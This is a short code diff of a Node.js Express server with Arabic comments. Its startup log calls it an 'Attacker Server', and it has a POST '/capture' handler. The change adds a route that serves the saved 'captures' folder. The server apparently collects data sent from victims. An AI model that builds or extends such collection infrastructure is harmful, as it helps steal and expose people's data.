@@ -1,6 +1,4 @@
-const express = require('express');
-const fs = require('fs');
-const path = require('path');
+const express = require('express'); const fs = require('fs'); const path = require('path');
 
 // إنشاء تطبيق Express
 const app = express();
@@ -53,6 +51,7 @@ app.post('/capture', (req, res) => {
     }
 });
 
+app.use('/captures', express.static(path.join(__dirname, 'captures')));
 // تشغيل الخادم
 app.listen(PORT, () => {
     console.log(`[!] Attacker Server running on http://localhost:${PORT}`);
